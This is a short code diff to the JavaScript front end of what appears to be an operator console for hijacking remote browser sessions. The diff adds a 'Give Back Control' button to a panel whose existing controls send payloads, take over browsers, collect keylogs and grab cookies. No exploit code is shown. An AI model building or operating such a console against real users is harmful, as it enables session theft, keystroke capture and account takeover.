@@ -53,6 +53,7 @@ socket.on("thumbnail", function(browser_id, thumbnail_blob, keylog){
         <td><button id="payload_${browser_id}" class="payload">Send Payload</button></td> \
         <td><button id="bootuser_${browser_id}" class="bootuser">Boot User</button></td> \
         <td><button id="takeover_${browser_id}" class="takeover">Take Over</button></td> \
+        <td><button id="giveback_${browser_id}" class="giveback">Give Back Control</button></td> \
         <td><button id="cookies_${browser_id}" class="cookies">Get Cookies</button></td> \
         <td><button id="remove_${browser_id}" class="remove">Remove Instance</button></td> \
         <td><span id="info_${browser_id}" class="info">browser:${browser_id}</span></td> \
@@ -105,6 +106,11 @@ $(document).on('click', '.takeover', function () {
   driving = true
   $("#browsers").hide()
   socket.emit('take_over_browser', browser_id, viewport_width, viewport_height)
+})
+
+$(document).on('click', '.giveback', function () {
+  let browser_id = this.id.replace("giveback_", "")
+  socket.emit('give_back_control', browser_id)
 })
 
 socket.on("push_state", function(new_state){
